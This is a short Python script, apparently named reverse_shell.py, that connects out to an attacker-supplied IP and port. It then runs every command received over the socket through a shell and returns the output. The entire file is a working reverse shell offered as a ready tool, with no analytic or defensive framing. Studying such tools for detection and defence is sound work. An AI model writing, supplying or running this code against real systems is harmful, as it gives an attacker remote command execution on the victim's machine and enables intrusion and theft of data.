import socket
import subprocess
import sys

def connect_to_attacker(attacker_ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, port))
        return s
    except Exception as e:
        print(f"Error connecting to the attacker: {e}")
        sys.exit(1)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def main(attacker_ip, port):
    try:
        attacker_socket = connect_to_attacker(attacker_ip, port)
        print("Connection established with the attacker.")

        while True:
            command = attacker_socket.recv(1024).decode("utf-8")

            if command.lower() == 'exit':
                attacker_socket.close()
                break

            output = execute_command(command)
            attacker_socket.sendall(output.encode("utf-8"))
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <attacker_ip> <port>")
        sys.exit(1)

    attacker_ip = sys.argv[1]
    port = int(sys.argv[2])

    print(f"Attempting to connect to {attacker_ip}:{port}...")
    main(attacker_ip, port)

